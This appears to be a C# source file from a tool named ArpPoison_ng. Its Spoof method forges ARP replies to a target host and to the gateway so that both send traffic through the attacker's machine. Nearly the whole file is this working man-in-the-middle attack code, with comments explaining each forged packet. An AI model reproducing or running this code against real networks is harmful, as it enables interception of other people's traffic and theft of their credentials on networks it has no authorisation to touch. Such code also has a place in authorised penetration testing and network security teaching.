using ArpPoison_ng.Interfaces;
using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;

namespace ArpPoison_ng.Services
{
    public class ArpPoison : IArpPoison
    {
        private readonly INetworkDeviceProvider _networkDeviceProvider;
        private readonly IArpPacketBuilder _arpPacketBuilder;
        public ArpPoison(INetworkDeviceProvider networkDeviceProvider, IArpPacketBuilder arpPacketBuilder)
        {
            _networkDeviceProvider = networkDeviceProvider;
            _arpPacketBuilder = arpPacketBuilder;
        }
        public void Spoof(ILiveDevice device, string targetIp, string gatewayIp, string targetMac, string gatewayMac)
        {
            // ARP poisoning: send forged ARP replies to both the target and the gateway
            // so each believes the attacker's MAC is associated with the other's IP.

            // Forge ARP reply to the target: claim gatewayIp is at our MAC
            var arpToTarget = _arpPacketBuilder.BuildArp(
                device.MacAddress,
                PhysicalAddress.Parse(targetMac),
                IPAddress.Parse(gatewayIp),    // spoofed sender protocol address (gateway IP)
                IPAddress.Parse(targetIp),     // target protocol address
                ArpOperation.Response);

            // Forge ARP reply to the gateway: claim targetIp is at our MAC
            var arpToGateway = _arpPacketBuilder.BuildArp(
                device.MacAddress,
                PhysicalAddress.Parse(gatewayMac),
                IPAddress.Parse(targetIp),     // spoofed sender protocol address (target IP)
                IPAddress.Parse(gatewayIp),    // gateway protocol address
                ArpOperation.Response);

            var ethToTarget = _arpPacketBuilder.BuildEthernet(device.MacAddress, PhysicalAddress.Parse(targetMac));
            ethToTarget.PayloadPacket = arpToTarget;
            device.SendPacket(ethToTarget);

            var ethToGateway = _arpPacketBuilder.BuildEthernet(device.MacAddress, PhysicalAddress.Parse(gatewayMac));
            ethToGateway.PayloadPacket = arpToGateway;
            device.SendPacket(ethToGateway);
        }
    }
}
